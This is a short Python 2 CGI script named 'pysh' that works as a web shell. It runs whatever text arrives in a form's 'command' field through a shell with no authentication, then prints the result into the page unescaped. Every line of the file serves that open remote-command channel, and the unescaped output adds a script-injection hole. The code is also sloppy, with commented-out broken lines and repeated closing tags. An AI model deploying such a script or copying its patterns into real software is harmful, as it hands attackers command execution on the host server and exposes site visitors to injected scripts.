#!/usr/bin/env python
import sys, subprocess, os
import cgi, shlex
import cgitb; cgitb.enable()  # for troubleshooting

print "Content-type: text/html"
print

print """
<html>

<head><title>pysh</title></head>

<body>
"""

form = cgi.FieldStorage()
command = form.getvalue("command", "")
x = subprocess.check_output(command, shell=True)
#if (x="")
#  x = os.path.join(subprocess.check_output(command, shell=True))
#current = form.getvalue("x", "")

print """
  <div>$ %s</div>
  <div> 
    <form>
      <p>$ <input type="text" name="command"/></p>
    </form>
  </div>

</body>

</html>
""" % shlex.split(command)
print """
  <div name="x">$ %s</div>
  
</body>

</html>
""" % x
print """
<form>
  <input value=%s name="current">
</form>
</body>

</html>
""" % x

